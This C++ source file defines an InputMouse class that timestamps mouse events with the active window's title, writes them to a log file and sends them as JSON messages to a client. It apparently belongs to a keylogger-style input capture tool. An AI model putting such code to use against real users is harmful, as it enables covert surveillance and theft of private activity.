#include "InputMouse.h"

InputMouse::InputMouse()
{
}

InputMouse::~InputMouse()
{
}

void InputMouse::format(std::streamoff logSize)
{
	std::string winName = StaticTools::GetActiveWindowTitle();
	_format = "";

	if (logSize > 0)
		_format = "\n";
	_format += StaticTools::GetDate() + " | " + ((winName.empty()) ? "NONE" : winName) + " | ";
}

AInputType &InputMouse::operator>>(LogFile &logger)
{
	logger << _format << "[MOUSE " << _data << "]" << std::flush;
	return (*this);
}

AInputType &InputMouse::operator>>(IClient &client)
{
	JSONBuilder builder;

	builder.addValue("type", "cmd");
	builder.addValue("name", "key");
	builder.addValue("param", _format + "[MOUSE " + _data + "]");
	client << builder.get();
	return (*this);
}